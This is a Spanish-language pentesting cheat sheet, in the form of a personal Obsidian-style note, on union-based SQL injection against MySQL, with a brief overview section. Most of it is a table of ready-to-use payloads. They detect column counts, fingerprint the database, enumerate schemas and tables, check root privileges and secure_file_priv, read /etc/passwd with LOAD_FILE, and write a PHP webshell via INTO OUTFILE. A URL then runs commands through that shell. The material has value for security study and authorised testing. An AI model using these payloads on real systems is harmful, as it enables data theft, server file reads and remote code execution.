---
aliases: null
tags:
  - type/technique
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[SQL Injection (SQLi)]]'
---
# SQLi  - Union based

***

## Cheatsheet

|                     **Fase de Explotación**                      |                                                                                                                                                                                                                             **Payload Estructural**                                                                                                                                                                                                                             |                                                               **Notas de Ejecución**                                                                |
| :--------------------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------: |
|                  <br>**Detección de columnas**                   |                                                                                                                                                                                                                      <br>`ORDER BY 1--`<br>`ORDER BY 2--`                                                                                                                                                                                                                       |             <br>Incremento el índice posicional hasta generar un error. El último número válido es el total exacto de columnas.<br><br>             |
|                   <br>**Alineación con Nulos**                   |                                                                                                                                                                                                                      <br>`UNION SELECT NULL, NULL, NULL--`                                                                                                                                                                                                                      | <br>Confirmo la cantidad de columnas. Uso `NULL` porque es compatible con la mayoría de los tipos de datos, evitando excepciones de casteo.<br><br> |
|                 <br>**Identificación de Tipos**                  |                                                                                                                                                                                                                      <br>`UNION SELECT 'a', NULL, NULL--`                                                                                                                                                                                                                       |           <br>Reemplazo iterativamente los nulos por cadenas de texto para descubrir qué columna refleja strings en el frontend.<br><br>            |
|                      <br>**Reconocimiento**                      |                                                                                                                                                                                                               <br>`UNION SELECT @@version, user(), database()--`                                                                                                                                                                                                                |                                    <br>Extracción inicial de metadatos del SGBD y contexto de ejecución.<br><br>                                    |
|              <br><br><br>**Enumeración de Esquema**              |                                                    <br>**Listar bases de datos**<br>`UNION SELECT schema_name, NULL FROM information_schema.schemata--`<br>**Listar tablas**<br>`UNION SELECT table_name, NULL FROM information_schema.tables where table_schema = "db"--`<br>**Listar columnas**<br>`UNION SELECT column_name, NULL FROM information_schema.columnshere table_schema = "db" and table_name = "tabla"--`<br>                                                    |                           <br><br><br>Volcado de las estructuras internas para planificar extracciones dirigidas.<br><br>                           |
|       <br><br><br><br><br>**Privilegios del Usuario**<br>        | <br>**Verificar si es Super Admin:**<br>`UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"--`<br>**Listar todos los privilegios:**<br>`UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"--`<br>**Verificar permisos File I/O:**<br>`UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"--`<br><br> |            <br><br><br><br><br>Verificación de los permisos del usuario que ejecuta la base de datos para evaluar vectores de escalada.             |
| <br><br><br><br>**Escalada Crítica: SQLi to RCE (File I/O)**<br> |                  <br>**LFI (Lectura de archivos):**<br>`UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`<br>**File Write (Prueba simple):**<br>`UNION SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt'`<br>**RCE (Subida de Webshell PHP):**<br>`UNION SELECT "",'<?=$_GET[0]?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -`<br>**Ejecución vía navegador:**<br>`http://IP:PUERTO/shell.php?0=cat%20/etc/passwd`<br><br>                   |    <br><br><br><br>Uso de privilegios elevados y mala configuración de `secure_file_priv` para interactuar con el sistema operativo subyacente.     |
^sqli-union


___

## Overview

El [[Union-based SQLi]] es un vector de ataque In-Band que aprovecha el operador `UNION` del lenguaje SQL para anexar un conjunto de resultados arbitrarios al conjunto de resultados de la consulta original elaborada por la aplicación. A diferencia del [[Error-based SQLi]] o las variantes inferenciales, esta técnica me permite recuperar grandes volúmenes de datos de forma directa y limpia dentro de la respuesta HTTP, convirtiéndola en el método de exfiltración más eficiente cuando el escenario lo permite.

Para que la inyección sea exitosa, la estructura de la consulta subyacente impone dos reglas matemáticas y lógicas que debo resolver antes de intentar cualquier exfiltración de datos.


***
